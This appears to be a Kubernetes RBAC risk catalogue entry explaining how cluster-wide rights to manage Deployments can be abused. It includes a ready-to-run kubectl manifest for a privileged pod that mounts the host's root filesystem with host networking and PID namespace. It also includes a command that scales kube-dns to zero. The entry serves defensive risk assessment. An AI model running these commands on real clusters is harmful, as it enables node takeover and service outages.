---
id: 1033
title: "Manage Deployments cluster-wide (potential for privileged pod execution)"
description: "Allows creating, updating, or deleting Deployments across all namespaces. Deployments manage pod replicas, and this permission can be used to deploy pods with privileged settings, leading to code execution, privilege escalation, persistence, and tampering with cluster workloads."
category: Elevation of Privilege
risk_level: RiskLevelCritical
date: ""
---

## Overview

| Field         | Value                                                                                                               |
| ------------- | ------------------------------------------------------------------------------------------------------------------- |
| ID            | 1033                                                                                                                |
| Name          | Manage Deployments cluster-wide (potential for privileged pod execution)                                            |
| Risk Category | Elevation of Privilege                                                                                              |
| Risk Level    | {{< risk Critical >}}                                                                                               |
| Role Type     | ClusterRole                                                                                                         |
| API Groups    | apps                                                                                                                |
| Resources     | deployments                                                                                                         |
| Verbs         | create, update, patch, delete                                                                                       |
| Tags          | {{< tag "Persistence" >}} {{< tag "PrivilegeEscalation" >}} {{< tag "Tampering" >}} {{< tag "WorkloadLifecycle" >}} |

## Description

Allows creating, updating, or deleting Deployments across all namespaces. Deployments manage pod replicas, and this permission can be used to deploy pods with privileged settings, leading to code execution, privilege escalation, persistence, and tampering with cluster workloads.

## Abuse Scenarios

1. Create a new Deployment with a privileged pod template.

```bash
kubectl create -n <namespace> -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: privileged-deployment
spec:
  replicas: 1
  selector:
    matchLabels:
      app: privileged-app
  template:
    metadata:
      labels:
        app: privileged-app
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: attacker
        image: busybox
        command: ["/bin/sh", "-c", "sleep infinity"]
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host-root
      volumes:
      - name: host-root
        hostPath:
          path: /
EOF
# Example: kubectl create -n default -f - <<EOF ... EOF

```

2. Scale a critical deployment to zero replicas, causing denial of service.

```bash
kubectl scale deployment <deployment-name> -n <namespace> --replicas=0
# Example: kubectl scale deployment kube-dns -n kube-system --replicas=0

```
